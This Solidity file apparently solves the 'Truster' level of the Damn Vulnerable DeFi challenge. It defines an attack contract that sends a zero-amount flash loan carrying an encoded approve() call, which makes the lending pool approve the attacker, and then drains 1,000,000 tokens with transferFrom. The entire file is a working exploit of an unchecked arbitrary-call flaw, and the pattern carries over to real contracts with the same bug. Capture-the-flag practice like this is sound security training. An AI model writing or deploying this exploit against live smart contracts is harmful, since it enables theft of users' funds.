// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ITrusterLenderPool} from "./ITrusterLenderPool.sol";

contract TrusterAttack{
    address internal owner;
    IERC20 public immutable damnValuableToken;
    ITrusterLenderPool public immutable trusterLenderPool;

    error NotOGOwner();
    
  
    constructor(address _tokenAddress, address _trusterLenderPoolAddress, address _owner){
        damnValuableToken = IERC20(_tokenAddress);
        trusterLenderPool = ITrusterLenderPool(_trusterLenderPoolAddress);
        owner = _owner;
    }

    function attack() external{
        // Revert incase a mevBot or whoever wants to get funny 
        if (msg.sender != owner) revert NotOGOwner();

        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000e18);

        trusterLenderPool.flashLoan(0,address(trusterLenderPool),address(damnValuableToken), approvePayload);

        damnValuableToken.transferFrom(address(trusterLenderPool), owner, 1_000_000e18);

    }
}